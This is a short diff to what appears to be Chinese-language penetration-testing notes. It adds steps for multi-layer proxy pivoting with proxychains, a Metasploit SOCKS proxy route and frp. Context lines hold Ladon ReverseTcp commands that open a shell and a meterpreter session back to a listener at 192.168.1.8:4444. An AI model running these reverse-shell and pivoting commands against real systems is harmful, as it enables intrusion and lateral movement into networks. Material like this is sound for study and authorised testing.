@@ -194,7 +194,11 @@ Ladon ReverseTcp 192.168.1.8 4444 shell
 Ladon ReverseTcp 192.168.1.8 4444 meter
 ```
 
-# proxy
+# proxy代理
+多层代理攻击方式
+1. proxychains
+2. msf route flush;set Proxies socks5:127.0.0.1:8989
+3. frp 映射代理到攻击，再按1，2操作。
 ## proxychains
 
 只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉
